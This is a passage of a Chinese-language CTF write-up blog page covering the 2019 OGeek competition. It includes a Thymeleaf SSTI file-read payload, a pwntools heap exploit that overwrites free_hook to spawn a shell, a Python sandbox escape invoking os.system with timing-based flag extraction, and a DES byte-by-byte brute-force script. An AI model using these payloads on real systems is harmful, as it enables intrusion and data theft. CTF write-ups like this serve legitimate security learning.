class="variable">t:</span> <span class="string">''</span></span><br><span class="line">    &#125;,</span><br><span class="line">    method<span class="variable">s:</span> &#123;</span><br><span class="line">        reques<span class="variable">t:</span> <span class="function"><span class="keyword">function</span><span class="params">(event)</span> &#123;</span></span><br><span class="line">            var <span class="keyword">vm</span> = this</span><br><span class="line">            axios.post(<span class="string">'/render'</span>, &#123;</span><br><span class="line">                conten<span class="variable">t:</span> <span class="keyword">vm</span>.content</span><br><span class="line">            &#125;)</span><br><span class="line">                .then(<span class="function"><span class="keyword">function</span> <span class="params">(response)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(response)</span><br><span class="line">                    <span class="keyword">vm</span>.result = response.data.result</span><br><span class="line">                &#125;)</span><br><span class="line">                .<span class="keyword">catch</span>(<span class="function"><span class="keyword">function</span> <span class="params">(error)</span> &#123;</span></span><br><span class="line">                    console.<span class="built_in">log</span>(error)</span><br><span class="line">                    <span class="keyword">vm</span>.result = error</span><br><span class="line">                &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>再根据题目Render，应该是个SSTI无疑</p>
+<p>学习文章：<a href="https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之SSTI漏洞/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/</a></p>
+<p>但是表示自己太菜了，甚至没看出来这个网页的框架</p>
+<p>于是先去做了别的题。</p>
+<p>之后队友说，是springboot，他说进入<a href="http://47.107.244.251:18080/render回显的是" target="_blank" rel="noopener">http://47.107.244.251:18080/render回显的是</a></p>
+<p><img src="/2019/08/27/OGeek_WP/1566791814833.png" alt="1566791814833"></p>
+<p>遂抓包，得到</p>
+<p><img src="/2019/08/27/OGeek_WP/1566744957290.png" alt="1566744957290"></p>
+<p>因为Spring Boot 官方推荐使用 “Thymeleaf”模板引擎</p>
+<p>于是试试是否有Thymeleaf 渲染</p>
+<p><img src="/2019/08/27/OGeek_WP/1566792157110.png" alt="1566792157110"></p>
+<p>发现失败，把思路丢给队友，让他再去试试。</p>
+<p>最后很尴尬，队友说，我符号用错了，该用大括号，（啊，低级错误，233333）</p>
+<p><img src="/2019/08/27/OGeek_WP/1566792249505.png" alt="1566792249505"></p>
+<p>回显成功，于是java读文件一把梭</p>
+<p>payload</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"content"</span>:<span class="type"></span>"[[$&#123;<span class="keyword">new</span> <span class="type">java</span>.io.BufferedReader(<span class="keyword">new</span> <span class="type">java</span>.io.FileReader(\<span class="string">"/flag\")).readLine()&#125;]]"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发包得到flag</p>
+<p><img src="/2019/08/27/OGeek_WP/1566745025562.png" alt="1566745025562"></p>
+<p>flag{nBz9mertYP@pyyZxx9@nn}</p>
+<h3 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h3><p>题目描述：Hidden in the history</p>
+<p>下载得到图片</p>
+<p>放进Stegsolve.jar，调整通道发现端倪</p>
+<p><img src="/2019/08/27/OGeek_WP/1566746459168.png" alt="1566746459168"></p>
+<p>LSB隐写，</p>
+<p>然后放进zsteg，导出得到字符串</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="attribute">QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA</span>==</span><br></pre></td></tr></table></figure>
+
+<p>去掉括号base64得到:</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Ao</span>(mgH[]<span class="symbol">WO</span>,r8US3GM2R2I<span class="comment">%YB7st</span></span><br></pre></td></tr></table></figure>
+
+<p>然后看不出特征，于是先base全家桶试了一波，发现是base85</p>
+<p>解得：flag{~h!%3W-9jKB6(fG}</p>
+<h3 id="mblockchain"><a href="#mblockchain" class="headerlink" title="mblockchain*"></a>mblockchain*</h3><p>题目描述：Let’s warm up!</p>
+<h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>题目描述：tip:题目环境为Ubuntu18.04，flag路径/home/flag</p>
+<p>这个题可以利用堆上的相对偏移然后通过delete来double free，且2.27版本libc因为有tacahe机制，所以doublefree的利用变得非常简单，先填满7个chunk，再free一个到unsortedbin里面去，利用里面main_arean的地址改写后面2个字节，爆破一下可以得到free_hook中的chunk，通过改写free_hook为puts的plt表，然后通过delete函数找到对应可以泄露libc的地址的偏移，然后就可以打印出libc的地址，再改写free_hook为system函数地址，再通过libc上/bin/sh字符串的偏移，成功执行system(“/bin/sh”)，getshell。脚本如下</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./hub')</span></span><br><span class="line">p = remote(<span class="string">'47.112.139.218'</span>, <span class="number">13132</span>)</span><br><span class="line">elf = ELF(<span class="string">'./hub'</span>)</span><br><span class="line"></span><br><span class="line">def choose(choice):</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(str(choice) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size):</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'How long will you stay?\n'</span>)</span><br><span class="line">    p.sendline(str(size) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which hub don\'t you want?\n'</span>)</span><br><span class="line">    p.sendline(str(index) + <span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">def edit(content):</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'What do you want?\n'</span>)</span><br><span class="line">    p.<span class="built_in">send</span>(content)</span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x200</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xe0</span>)</span><br><span class="line">edit(<span class="string">'\xe8\x68'</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0xf0</span>)</span><br><span class="line">edit(p64(elf.plt[<span class="string">'puts'</span>]))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x1ee0</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3eba83</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">"libcbase:%#x"</span> %libcbase)</span><br><span class="line">system_addr = libcbase + <span class="number">0x4f440</span></span><br><span class="line">edit(p64(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">-0x239a4e</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/27/OGeek_WP/1566789122210.png" alt="1566789122210"></p>
+<h3 id="Enjoy-Your-Self"><a href="#Enjoy-Your-Self" class="headerlink" title="Enjoy Your Self *"></a>Enjoy Your Self *</h3><p>题目描述：time is the money</p>
+<h3 id="8v"><a href="#8v" class="headerlink" title="8v"></a>8v</h3><p>题目描述：I run the js code and get flag</p>
+<p>得到一份文档，全是字节码，遂开始一行一行“翻译”</p>
+<p>参考文章</p>
+<p><a href="https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/interpreter-generator.cc</a></p>
+<p><a href="https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h" target="_blank" rel="noopener">https://github.com/v8/v8/blob/master/src/interpreter/bytecodes.h</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/28590489" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/28590489</a></p>
+<p><a href="https://github.com/danbev/learning-v8" target="_blank" rel="noopener">https://github.com/danbev/learning-v8</a></p>
+<p>看懂完指令并不是很难，核心就是一个简单的三项数异或加密，</p>
+<p>然后存在两个类似于斐波那契数列的前后相关的数列，</p>
+<p>数列a起始位是a<del>1</del>=88</p>
+<p>函数是：a<del>n</del>=(a<del>n-1</del>*65+66)%256</p>
+<p>得到数列：a = [88, 154, 92, 158, 96, 162, 100, 166, 104, 170, 108, 174, 112, 178, 116, 182, 120, 186, 124, 190, 128, 194, 132, 198, 136, 202, 140, 206, 144, 210,]</p>
+<p>数列b起始位是b<del>1</del>=148</p>
+<p>函数是：b<del>n</del>=(b<del>n-1</del>*35-16)%256</p>
+<p>最后程序还有个将数列b逆序的操作</p>
+<p>得到数列：b=[236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148, 12, 52, 236, 212, 204, 116, 172, 20, 140, 180, 108, 84, 76, 244, 44, 148]</p>
+<p>再加上</p>
+<p>enc=b’\xd2”\xf1\x8d\xb7\xe0\xd0MF\x87T?\x1fI\x1c\xe7\xcb\x07\xc3\x95z\xb3z\x0b\xbb\xdb\xa1I\xc5;’</p>
+<p>最后三个数列逐位异或，得到</p>
+<p>flag{V8_ByteCode_is_Very_Easy}</p>
+<h3 id="PyBox"><a href="#PyBox" class="headerlink" title="PyBox"></a>PyBox</h3><p>题目描述：cut flag sleep repeat</p>
+<p>连上沙箱</p>
+<p><img src="/2019/08/27/OGeek_WP/1566793870950.png" alt="1566793870950"></p>
+<p>看着像python，但是这个python为啥没有一点点功能？啥也不能干？也没有回显。</p>
+<p>不过没有回显倒可以利用sql的时间盲注的方法，但是有啥功能能利用呢？</p>
+<p>于是去学习沙箱逃逸一波</p>
+<p><a href="https://bestwing.me/awesome-python-sandbox-in-ciscn.html" target="_blank" rel="noopener">https://bestwing.me/awesome-python-sandbox-in-ciscn.html</a></p>
+<p><img src="/2019/08/27/OGeek_WP/1566794006869.png" alt="1566794006869"></p>
+<p>发现了这个，</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'l'</span>+<span class="string">'s home'</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/27/OGeek_WP/1566794300675.png" alt="1566794300675"></p>
+<p>没有报错，</p>
+<p>但是这里没有回显呃，于是，时间盲注结合closure，</p>
+<p>再根据这篇文章<a href="https://blog.csdn.net/caoshunxin01/article/details/79355566" target="_blank" rel="noopener">https://blog.csdn.net/caoshunxin01/article/details/79355566</a></p>
+<p>利用cut - c 逐位爆破</p>
+<p>payload:</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">__import__</span><span class="selector-class">.__getattribute__</span>(<span class="string">'__clo'</span>+<span class="string">'sure__'</span>)<span class="selector-attr">[0]</span><span class="selector-class">.cell_contents</span>(<span class="string">'o'</span>+<span class="string">'s'</span>)<span class="selector-class">.__getattribute__</span>(<span class="string">'sy'</span>+<span class="string">'stem'</span>)(<span class="string">'flag_p=`cut -c 1 /home/flag`; [ $flag_p = \"f\" ] &amp;&amp; sleep 2'</span></span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"47.112.108.17"</span>,<span class="number">12312</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ans = <span class="string">"__import__.__getattribute__('__clo'+'sure__')[0].cell_contents('o'+'s').__getattribute__('sy'+'stem')('a=`cut -c 1 /home/flag`; [ $a = \"</span>f\<span class="string">" ] &amp;&amp; sleep 1'"</span></span><br><span class="line">t = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">sh.sendline(ans)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt;&gt;&gt;"</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">time</span>.<span class="built_in">time</span>()-t &gt; <span class="number">0.5</span> :</span><br><span class="line">	print(<span class="string">"get!"</span>)</span><br><span class="line">	break</span><br></pre></td></tr></table></figure>
+
+<p>得到回显</p>
+<p><img src="/2019/08/27/OGeek_WP/1566799922178.png" alt="1566799922178"></p>
+<p>利用成功。再加两个循环，就好了。</p>
+<p>得到结果</p>
+<p><img src="/2019/08/27/OGeek_WP/1566800671679.png" alt="1566800671679"></p>
+<p>不知道是不是后来改flag了，之前跑脚本得到的是</p>
+<p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x}</p>
+<p>写wp复现的时候得到的是</p>
+<p>flag{Pyt5on_S4ndB0x+4pParmOr_S4ndb0x_sorry}  </p>
+<p>hhhh?</p>
+<h3 id="Easy-Realworld-Challenge"><a href="#Easy-Realworld-Challenge" class="headerlink" title="Easy Realworld Challenge *"></a>Easy Realworld Challenge *</h3><p>题目描述：study easy easy easy Python (flag is in intranet `/flag`)</p>
+<h3 id="Babycry"><a href="#Babycry" class="headerlink" title="Babycry"></a>Babycry</h3><p>nc 过去得到加密规则</p>
+<p><img src="/2019/08/27/OGeek_WP/1566747202519.png" alt="1566747202519"></p>
+<p>写wp的时候环境关了，这里就直接口述了。</p>
+<p>既然加密规则是des（key,sth..flag{*}padding）</p>
+<p>加上hint</p>
+<p>所以我们控制输入，可以使得被加密的字符末尾为</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure>
+
+<p>首先我们先输入</p>
+<p>des a</p>
+<p>des aa</p>
+<p>des aaa</p>
+<p>直到拼接后的字符串长度为8的倍数，</p>
+<p>印象里应该是两个a的时候，就好了。</p>
+<p>然后我们当输入三个a的时候，字符串应该就是aaaflag{*}再加上七个_，那么末尾就应该是一个}加七个_组成的，</p>
+<p>密文末尾的8个字节，就是这一个}加七个_字符所组成的八个字符的密文</p>
+<p>我们可以输入</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure>
+
+<p>看返回的密文的前8个字节加一验证。</p>
+<p>于是思路就是，控制padding，逐位爆破，</p>
+<p>输入aaaa，返回密文的后8字节就是明文    </p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&#125;______（<span class="number">6</span>个<span class="literal">_</span>）				<span class="meta">#?代表flag最后一位字符</span></span><br></pre></td></tr></table></figure>
+
+<p>的密文</p>
+<p>然后我们在爆破这一位，直到返回密文的前八个字节与输入aaaa返回的密文的最后8字节相同位置，</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level =<span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">sh</span>=remote(<span class="string">"139.9.222.76"</span>,19999)</span><br><span class="line"><span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(33,126):</span><br><span class="line">    ans = <span class="string">"des "</span>+chr(i)+<span class="string">"&#125;______"</span></span><br><span class="line">    <span class="keyword">sh</span>.sendline(ans)</span><br><span class="line">    p = <span class="keyword">sh</span>.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"54f6d4254fe2a8d4"</span> <span class="keyword">in</span> p :</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"get!"</span>)</span><br><span class="line">        <span class="keyword">print</span>(ans)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>得到结果</p>
+<p><img src="/2019/08/27/OGeek_WP/1566788477725.png" alt="1566788477725"></p>
+<p>然后以此类推，逐位爆破。</p>
+<p>后面还有点区别就是，爆破完8位，用来验证的密文不能再从末尾找了，得找之前找的8个字节密文的前8个字节密文。</p>
+<p>比赛的时候就是用这个半自动化脚本手撸的，</p>
+<p>原本想在写wp的时候写个全自动化的，奈何环境关了，没法测试。遂放弃。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Write-UP/" rel="tag"># Write UP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/21/fakebook/" rel="next" title="BUUOJ-SSRF">
+                <i class="fa fa-chevron-left"></i> BUUOJ-SSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/08/29/第五空间/" rel="prev" title="第五空间-Web WP">
+                第五空间-Web WP <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="V">
+            
+              <p class="site-author-name" itemprop="name">V</p>
+              <p class="site-description motion-element" itemprop="description">It is not ignorance and weakness but arrogance that destroys mankind</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fzwjscj.top/" title="fzwjscj" target="_blank">fzwjscj</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://dldxz.cn/" title="DLDXZ" target="_blank">DLDXZ</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fanda.cloud/" title="fanda" target="_blank">fanda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://passingfoam.com/" title="PassingFoam's blog" target="_blank">PassingFoam's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://eqqie.cn/" title="eqqie's blog" target="_blank">eqqie's blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#OGeek-CTF-WP"><span class="nav-number">1.</span> <span class="nav-text">OGeek-CTF WP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#catch-fun"><span class="nav-number">1.0.1.</span> <span class="nav-text">catch fun</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Realworld-Challenge-2"><span class="nav-number">1.0.2.</span> <span class="nav-text">Easy Realworld Challenge 2 *</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babyrop"><span class="nav-number">1.0.3.</span> <span class="nav-text">babyrop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#book-manager"><span class="nav-number">1.0.4.</span> <span class="nav-text">book manager</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LookAround"><span class="nav-number">1.0.5.</span> <span class="nav-text">LookAround</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Render"><span class="nav-number">1.0.6.</span> <span class="nav-text">Render</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2019"><span class="nav-number">1.0.7.</span> <span class="nav-text">2019</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mblockchain"><span class="nav-number">1.0.8.</span> <span class="nav-text">mblockchain*</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hub"><span class="nav-number">1.0.9.</span> <span class="nav-text">Hub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enjoy-Your-Self"><span class="nav-number">1.0.10.</span> <span class="nav-text">Enjoy Your Self *</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8v"><span class="nav-number">1.0.11.</span> <span class="nav-text">8v</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PyBox"><span class="nav-number">1.0.12.</span> <span class="nav-text">PyBox</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Easy-Realworld-Challenge"><span class="nav-number">1.0.13.</span> <span class="nav-text">Easy Realworld Challenge *</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Babycry"><span class="nav-number">1.0.14.</span> <span class="nav-text">Babycry</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">V</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
